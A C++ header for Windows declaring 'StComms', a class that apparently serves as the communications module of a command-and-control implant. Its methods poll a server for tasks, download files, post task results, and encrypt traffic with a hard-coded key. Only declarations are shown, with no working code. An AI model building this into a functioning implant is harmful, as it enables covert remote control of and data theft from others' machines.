#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include "base64.h"
#include "parser.h"
#include <vector>

#pragma comment(lib, "winhttp.lib")

#define FALLBACK_PORT 80
#define DOWNLOAD_ENDPOINT "/getFile/"

class StComms
{
private:
	std::string ip_address;
	int port;
	std::string endpoint;
	const char key[11] = {0x6e, 0x6f, 0x74, 0x6d, 0x65, 0x72, 0x73, 0x65, 0x6e, 0x6e, 0x65};

public:
	StComms(std::string id, std::string ip, int port);
	~StComms();
	
	bool getTask(std::vector<std::string>* pTaskVector);
	void tokenizeResponse(std::string response, std::vector<std::string>* pTaskVector);
	int downloadFile(std::string filename, std::string &result);
	void prepareTaskResponse(std::string &responseString, std::string cmdIndex, std::string &taskResults);
	void postTaskResponse(std::string cmdIndex, std::string &taskResults);
	
	std::string sendRequest(LPCWSTR requestType, std::string ip, std::string endpoint, std::string const&data);

	//Helpers
	void decrypt(std::string &decodedString);
	void encrypt(std::string &resultData);
};